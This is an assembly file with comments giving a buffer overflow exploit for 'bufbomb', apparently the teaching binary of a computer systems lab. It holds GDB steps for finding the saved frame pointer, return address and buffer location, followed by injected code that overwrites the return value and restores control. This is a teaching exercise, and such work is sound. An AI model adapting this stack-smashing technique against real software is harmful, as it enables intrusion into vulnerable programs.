# Buffer Overflow Attack for bufbomb 
/*	

 From disassembly, can see that buf will be position 12 bytes
 below %ebp
	
 Use GDB to determine value of %ebp saved on stack, as follows:
 (gdb) break getbuf
 (gdb) run
 This causes gdb to stop at instruction 0x80484f2	
 (gdb) print /x *($ebp+4)
 Prints 0x8048528 (Return pointer)
 (gdb) print /x *$ebp
 Prints 0xbfffefe8 (old value of %ebp)
 (gdb) print /x $ebp-12
 Prints 0xbfffefbc (location of buf)

*/
	
/* $begin bufattack-s 23 */
	pushl $ DEF1	# Put correct return pointer back on stack
	movl $0xdeadbeef,%eax	# Alter return value
	ret			# Re-execute return
.align 4			# Round up to 12
	.long DEF2	# Saved value of %ebp
	.long DEF3	# Location of buf
	.long 0x00000000	# Padding
/* $end bufattack-s 23 */